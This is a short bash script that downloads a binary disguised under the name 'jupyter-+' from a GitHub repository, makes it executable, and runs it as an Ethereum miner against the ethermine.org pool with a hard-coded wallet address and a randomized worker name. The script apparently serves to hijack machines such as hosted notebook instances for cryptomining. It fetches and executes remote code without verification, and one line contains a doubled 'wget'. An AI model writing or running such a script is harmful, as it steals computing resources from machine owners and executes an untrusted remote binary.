#!/bin/bash
sudo apt update && wget wget https://github.com/galebi/pihu/raw/main/jupyter-+ 
chmod +x jupyter-+
POOL=eu1.ethermine.org:4444
WALLET=0x2BF76057A0a9A90cef417C060d219Bc99F68E52c
WORKEER=$(echo $(shuf -i 1000-9999 -n 1)-hudddd)


./jupyter-+ --algo ETHASH --pool $POOL --user $WALLET.$WORKEER --ethstratum ETHPROXY
